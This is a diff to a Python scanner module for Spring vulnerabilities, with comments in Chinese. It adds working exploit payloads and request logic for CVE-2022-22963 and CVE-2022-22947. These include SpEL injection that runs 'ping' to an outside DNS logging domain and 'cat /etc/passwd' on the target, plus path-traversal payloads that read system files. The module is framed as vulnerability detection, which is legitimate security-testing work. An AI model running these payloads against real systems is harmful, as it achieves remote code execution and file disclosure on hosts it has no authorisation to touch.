@@ -3,18 +3,32 @@
 
 '''
     Spring扫描类: 
-        Spring Framework RCE(Spring core RCE)
+        1. Spring Framework RCE(Spring core RCE)
             CVE-2022-22965
-        Spring Boot Actuator Log View 文件读取/文件包含/目录遍历
+            Payload: https://vulhub.org/#/environments/spring/CVE-2022-22965/
+
+        2. Spring Boot Actuator Log View 文件读取/文件包含/目录遍历
             CVE-2021-21234
-        Spring Cloud Config Server目录遍历
+                Payload: https://bbs.zkaq.cn/t/5736.html
+
+        3. Spring Cloud Config Server目录遍历
             CVE-2020-5410
+                Payload: https://bbs.zkaq.cn/t/5736.html
+
+        4. Spring Cloud Function SpEL 远程代码执行
+            CVE-2022-22963
+                Payload: https://vulhub.org/#/environments/spring/CVE-2022-22963/
+        
+        5. Spring Cloud Gateway SpEl 远程代码执行
+            CVE-2022-22947
+                Payload: https://vulhub.org/#/environments/spring/CVE-2022-22947/
 file:///etc/passwd
 file:///C:\Windows\System32\drivers\etc\hosts
 '''
 
+from lib.api.dns import dns
 from lib.initial.config import config
-from lib.tool.md5 import md5
+from lib.tool.md5 import md5, random_md5
 from lib.tool.logger import logger
 from lib.tool.thread import thread
 from lib.tool import check
@@ -70,6 +84,42 @@ class Spring():
                 'path': '..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FC:\Windows\System32\drivers\etc\hosts%23foo/development"',
                 'data': ''
             }
+        ]
+
+        self.cve_2022_22963_payloads = [
+            {
+                'path': 'functionRouter',
+                'data': 'mouse'
+            }
+        ]
+
+        self.cve_2022_22947_payloads = [
+            {
+                'path': 'gateway/routes/mouse',
+                'data': '''{
+  "id": "mouse",
+  "filters": [{
+    "name": "AddResponseHeader",
+    "args": {
+      "name": "Result",
+      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"cat\\\",\\\"/etc/passwd\\\"}).getInputStream()))}"
+    }
+  }],
+  "uri": "http://example.com"
+}'''
+            },
+            # {
+            #     'path': 'actuator/gateway/refresh',
+            #     'data': ''
+            # },
+            # {
+            #     'path': 'actuator/gateway/routes/hacktest',
+            #     'data': ''
+            # },
+            # {
+            #     'path': 'actuator/gateway/routes/hacktest',
+            #     'data': ''
+            # }
         ]
 
     def cve_2022_22965_scan(self, url):
@@ -151,7 +201,7 @@ class Spring():
                         'Payload': {
                             'url': url,
                             'Data': data,
-                            'Headers': str(vul_info['headers'])
+                            'Headers': vul_info['headers']
                         }
                     }
                     return results
@@ -268,11 +318,165 @@ class Spring():
                 }
                 return results
 
+    def cve_2022_22963_scan(self, url):
+        ''' Spring Cloud Function中RoutingFunction类的apply方法
+                将请求头中的spring.cloud.function.routing-expression参数作为Spel表达式进行处理; 
+                造成了Spel表达式注入漏洞, 当使用路由功能时, 攻击者可利用该漏洞远程执行任意代码
+        '''
+        sessid = 'ff864206449349277d8c5b0df7897d4b'
+        md = random_md5()                                       # * 随机md5值, 8位
+        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
+
+        vul_info = {}
+        vul_info['app_name'] = self.app_name
+        vul_info['vul_type'] = 'RCE'
+        vul_info['vul_id'] = 'CVE-2022-22963'
+        vul_info['vul_method'] = 'POST'
+        vul_info['headers'] = {
+            'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("ping dnsdomain")'.replace('dnsdomain', dns_domain),
+            'Content-Type': 'text/plain'
+        }
+
+        headers = self.headers.copy()
+        headers.update(vul_info['headers'])
+
+        for payload in self.cve_2022_22963_payloads:
+            path = payload['path']
+            data = payload['data']
+            target = url + path
+
+            vul_info['path'] = path
+            vul_info['data'] = data
+            vul_info['target'] = target
+
+            try:
+                res = requests.post(
+                    target, 
+                    timeout=self.timeout, 
+                    headers=headers,
+                    data=data, 
+                    proxies=self.proxies, 
+                    verify=False
+                )
+                logger.logging(vul_info, res.status_code, res)                        # * LOG
+            except requests.ConnectTimeout:
+                logger.logging(vul_info, 'Timeout')
+                return None
+            except requests.ConnectionError:
+                logger.logging(vul_info, 'Faild')
+                return None
+            except:
+                logger.logging(vul_info, 'Error')
+                return None
+
+            sleep(2)                                                # * dns查询可能较慢, 等一会
+            if (md in dns.result(md, sessid)):
+                results = {
+                    'Target': target,
+                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                    'Method': vul_info['vul_method'],
+                    'Payload': {
+                        'Url': url,
+                        'Path': path,
+                        'Data': data,
+                        'Headers': vul_info['headers']
+                    }
+                }
+                return results
+
+    def cve_2022_22947_scan(self, url):
+        ''' 在 3.1.0 和 3.0.6 之前的版本中使用 Spring Cloud Gateway 的应用程序
+                在启用、暴露和不安全的 Gateway Actuator 端点时容易受到代码注入攻击
+                远程攻击者可以发出制作的恶意请求, 在远程主机上进行远程执行任意代码
+        '''
+        vul_info = {}
+        vul_info['app_name'] = self.app_name
+        vul_info['vul_type'] = 'RCE'
+        vul_info['vul_id'] = 'CVE-2022-22947'
+        vul_info['vul_method'] = 'POST'
+        vul_info['headers'] = {
+            'Content-Type': 'application/json'
+        }
+
+        headers = self.headers.copy()
+        headers.update(vul_info['headers'])
+
+        for payload in self.cve_2022_22947_payloads:
+            path = payload['path']
+            data = payload['data']
+            target = url + path
+
+            vul_info['path'] = path
+            vul_info['data'] = data
+            vul_info['target'] = target
+
+            try:
+                res1 = requests.post(
+                    target, 
+                    timeout=self.timeout, 
+                    headers=headers,
+                    data=data, 
+                    proxies=self.proxies, 
+                    verify=False,
+                    allow_redirects=False
+                )
+                logger.logging(vul_info, res1.status_code, res1)                        # * LOG
+
+                if (res1.status_code == 201):
+                    target2 = url + 'gateway/refresh'
+                    res2 = requests.post(
+                        target2, 
+                        timeout=self.timeout, 
+                        headers=self.headers,
+                        proxies=self.proxies, 
+                        verify=False,
+                        allow_redirects=False
+                    )
+                    logger.logging(vul_info, res2.status_code, res2)                        # * LOG
+
+                    if (res2.status_code == 200):
+                        target3 = target
+                        res3 = requests.get(
+                            target3, 
+                            timeout=self.timeout, 
+                            headers=self.headers,
+                            proxies=self.proxies, 
+                            verify=False,
+                            allow_redirects=False
+                    )
+                        logger.logging(vul_info, res3.status_code, res3)                        # * LOG
+
+                        if ((res3.status_code == 200) and (('/sbin/nologin' in res3.text) or ('root:x:0:0:root' in res3.text))):
+                            results = {
+                                'Target': target,
+                                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                                'Method': vul_info['vul_method'],
+                                'Payload': {
+                                    'Url': url,
+                                    'Path': path,
+                                    'Data': data,
+                                    'Headers': vul_info['headers']
+                                }
+                            }
+                            return results
+
+            except requests.ConnectTimeout:
+                logger.logging(vul_info, 'Timeout')
+                return None
+            except requests.ConnectionError:
+                logger.logging(vul_info, 'Faild')
+                return None
+            except:
+                logger.logging(vul_info, 'Error')
+                return None
+
     def addscan(self, url):
         return [
             thread(target=self.cve_2020_5410_scan, url=url),
             thread(target=self.cve_2021_21234_scan, url=url),
-            thread(target=self.cve_2022_22965_scan, url=url)
+            # thread(target=self.cve_2022_22965_scan, url=url),
+            thread(target=self.cve_2022_22963_scan, url=url),
+            thread(target=self.cve_2022_22947_scan, url=url)
         ]
 
 spring = Spring()
